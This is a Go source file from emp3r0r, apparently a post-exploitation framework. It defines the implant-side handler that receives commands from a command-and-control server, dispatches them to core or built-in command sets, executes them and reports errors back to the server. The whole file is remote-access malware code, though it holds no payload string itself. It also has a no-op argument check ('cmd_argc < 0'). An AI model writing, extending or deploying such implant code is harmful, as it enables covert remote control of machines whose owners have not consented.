package handler

import (
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

// exec cmd from C2 server
func HandleC2Command(cmdData *def.MsgTunData) {
	defer func() {
		if r := recover(); r != nil {
			logging.Printf("HandleC2Command panic: %v", r)
		}
	}()
	job_id := cmdData.JobID
	cmd_argc := len(cmdData.CmdSlice)
	cmdSlice := append(cmdData.CmdSlice, []string{"--job_id", job_id}...)
	if cmd_argc < 0 {
		logging.Printf("Invalid command: %v", cmdSlice)
	}
	logging.Printf("Received command: %v", cmdSlice)
	command := CoreCommands()
	is_builtin := strings.HasPrefix(cmdSlice[0], "!")
	if is_builtin {
		command = C2Commands()
	}
	command.SetArgs(cmdSlice)
	command.SetOutput(logging.Writer())
	err := command.Execute()
	if err != nil {
		c2transport.NotifyC2(command, "Error: %v", err)
	}
}
